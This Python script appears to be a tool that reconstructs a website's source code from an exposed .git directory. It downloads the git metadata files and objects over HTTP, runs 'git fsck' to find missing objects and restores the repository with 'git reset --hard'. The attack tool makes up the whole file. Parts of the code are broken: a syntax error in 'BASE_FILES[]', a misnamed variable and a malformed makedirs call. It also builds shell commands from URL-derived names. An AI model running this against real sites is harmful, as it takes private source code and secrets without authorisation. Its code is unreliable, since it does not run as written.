#!/usr/bin/env python3
# -*- coding:utf-8 -*-
"""
    Author : Virink <virink@outlook.com>
    Date   : 2019/06/03, 15:33
"""
import os
import sys
import re
import time
import threading
import requests
import asyncio


try:
    from .common import *
except:
    from common import *

log = []

NUMBER_OF_THREAD = 10
MAX_QUEUE_NUM = 4096

BASE_FILES = [
    '.git/config',
    '.git/ORIG_HEAD',
    '.git/HEAD',
    '.git/info/exclude',
    '.git/logs/HEAD',
    '.git/logs/refs/heads/master',
    '.git/logs/refs/stash',
    '.git/description',
    '.git/hooks/commit-msg.sample',
    '.git/hooks/pre-rebase.sample',
    '.git/hooks/pre-commit.sample',
    '.git/hooks/applypatch-msg.sample',
    '.git/hooks/fsmonitor-watchman.sample',
    '.git/hooks/pre-receive.sample',
    '.git/hooks/prepare-commit-msg.sample',
    '.git/hooks/post-update.sample',
    '.git/hooks/pre-applypatch.sample',
    '.git/hooks/pre-push.sample',
    '.git/hooks/update.sample',
    '.git/refs/heads/master',
    '.git/refs/stash',
    '.git/index',
    '.git/COMMIT_EDITMSG'
]

q = asyncio.Queue(maxsize=MAX_QUEUE_NUM)


async def _async_download_file(q):
    while not q.empty():
        f = await q.get()
        _download_file(f['u'], f['p'])
        await asyncio.sleep(0.05)


def _get_sha1(content):
    result = re.findall(r"([a-fA-F0-9]{40})", content)
    return result


def _fix_missing(baseurl, temppath):
    global q
    os.system("cd ./%s && git fsck > ../cache.dat 2>&1" % temppath)
    missing = []
    if not os.path.exists("./cache.dat"):
        cprint(CRED, "[-] Missing Objects Not Found")
        return False
    with open("./cache.dat", "r") as f:
        missing += _get_sha1(f.read())
    length = len(missing)
    os.unlink("./cache.dat")
    for i in missing:
        path = "./%s/.git/objects/%s/%s" % (temppath, i[0:2], i[2:])
        url = "%sobjects/%s/%s" % (baseurl, i[0:2], i[2:])
        q.put_nowait({"u": url, "p": path})
    if length > 1:
        return _fix_missing(baseurl, temppath)
    else:
        loop = asyncio.get_event_loop()
        tasks = [_async_download_file(q) for i in range(NUMBER_OF_THREAD)]
        loop.run_until_complete(asyncio.wait(tasks))
        loop.close()
        return True


def _download_file(url, path):
    if url in log:
        return
    log.append(url)
    index = path[::-1].find("/")
    folder = path[0:-index]
    try:
        os.makedirs(folder)
    except:
        pass
    _file = url[url.find('.git/'):]
    res = requests.get(url)
    if res.status_code == 200:
        with open(path, "wb") as f:
            f.write(res.content)
            cprint(CGREEN, "[+] ", CBEIGE, "[ %s ]" % _file)
            return True
    else:
        cprint(CRED, "[-] ", CVIOLET, "[ %s ] " %
               _file, CRED, "[%d]" % res.status_code)
        return False


def _get_prefix(baseurl):
    prefix = ""
    m = re.findall(r'https?://(.*?)\.git/', baseurl)
    if m and len(m) > 0:
        prefix = m[0]
    return prefix


def _repalce_bad_chars(path):
    return path.replace("/", "_").replace("\\", " _ ") \
        .replace(".", "_").replace("'", "_").replace("\"", "_")


def _complete_url(baseurl):
    if (not baseurl.startswith("http://")) and (not baseurl.startswith("https://")):
        baseurl = "http://" + baseurl
    if baseurl.endswith(".git/"):
        return baseurl
    else:
        return baseurl + ".git/"


def func_githack(*args):
    baseurl = args[0]
    baseurl = _complete_url(baseurl)
    temppath = _repalce_bad_chars(_get_prefix(baseurl))[:-1]
    cprint(CYELLOW, "[!] Base Files Fetching... ")
    for i in BASE_FILES[]:
        path = "./%s/%s" % (temppath, i)
        url = baseurl + i[len(".git/"):]
        ret = _download_file(url, path)

    cprint(CYELLOW, "[!] Commit Objects Fetching...")
    _commitFile = "./%s/.git/logs/refs/heads/master" % temppath
    if not os.path.exists(_commitFile):
        cprint(CRED, "[-] Commit Objects Not Found")
    else:
        master = open(_commitFile, "r")
        for line in master:
            _tmp = line.split(" ")
            pH = tmp[0]
            nH = tmp[1]
            path = "./%s/.git/objects/%s/%s" % (temppath, nH[0:2], nH[2:])
            url = "%sobjects/%s/%s" % (baseurl, nH[0:2], nH[2:])
            try:
                os.makedirs("./%s/%s", (temppath, path))
            except Exception as e:
                pass
            _download_file(url, path)
    cprint(CYELLOW, "[!] Stash Objects Fetching...")
    _stashFile = "./%s/.git/logs/refs/stash" % temppath
    if not os.path.exists(_stashFile):
        cprint(CRED, "[-] Stash Objects Not Found")
    else:
        master = open(_stashFile, "r")
        for line in master:
            _tmp = line.split(" ")
            pH = tmp[0]
            nH = tmp[1]
            path = "./%s/.git/objects/%s/%s" % (temppath, nH[0:2], nH[2:])
            url = "%sobjects/%s/%s" % (baseurl, nH[0:2], nH[2:])
            try:
                os.makedirs("./%s/%s", (temppath, path))
            except Exception as e:
                pass
            _download_file(url, path)
    cprint(CYELLOW, "[+] Start fixing missing files...")
    if _fix_missing(baseurl, temppath):
        os.system("cd ./%s && git reset --hard > /dev/null" % temppath)
        cprint(CGREEN, "[+] All file downloaded!")
        cprint(CGREEN, "[+] Clone Success. Dist File : ./%s" % temppath)
    else:
        cprint(CRED, "[-] Oh My God, .git Not Found")
    return ""


if __name__ == "__main__":
    url = "http://127.0.0.1/"
    func_githack(url)
